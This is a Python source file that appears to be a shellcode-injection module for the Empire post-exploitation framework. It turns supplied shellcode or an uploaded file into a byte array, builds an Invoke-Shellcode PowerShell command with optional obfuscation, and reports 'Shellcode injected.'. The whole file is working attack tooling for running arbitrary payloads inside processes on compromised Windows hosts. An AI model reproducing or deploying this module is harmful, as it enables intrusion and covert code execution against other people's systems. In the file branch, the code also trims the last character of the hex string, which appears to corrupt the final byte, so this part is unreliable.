from __future__ import print_function

import base64
from builtins import object, str
from typing import Dict

from empire.server.core.module_models import EmpireModule


class Module(object):
    @staticmethod
    def generate(
        main_menu,
        module: EmpireModule,
        params: Dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ):
        # read in the common module source code
        script, err = main_menu.modulesv2.get_module_source(
            module_name=module.script_path,
            obfuscate=obfuscate,
            obfuscate_command=obfuscation_command,
        )

        script_end = "\nInvoke-Shellcode -Force"

        for option, values in params.items():
            if option.lower() != "agent" and option.lower() != "listener":
                if values and values != "":
                    if option.lower() == "shellcode":
                        # transform the shellcode to the correct format
                        sc = ",0".join(values.split("\\"))[0:]
                        script_end += " -" + str(option) + " @(" + sc + ")"
                    elif option.lower() == "file":
                        data = base64.b64decode(params["File"].get_base64_file())
                        sc = ",".join([f"0x{byte:02x}" for byte in data])
                        script_end += f" -shellcode @({sc[:-1]})"
                    else:
                        script_end += " -" + str(option) + " " + str(values)

        script_end += "; 'Shellcode injected.'"

        script = main_menu.modulesv2.finalize_module(
            script=script,
            script_end=script_end,
            obfuscate=obfuscate,
            obfuscation_command=obfuscation_command,
        )
        return script
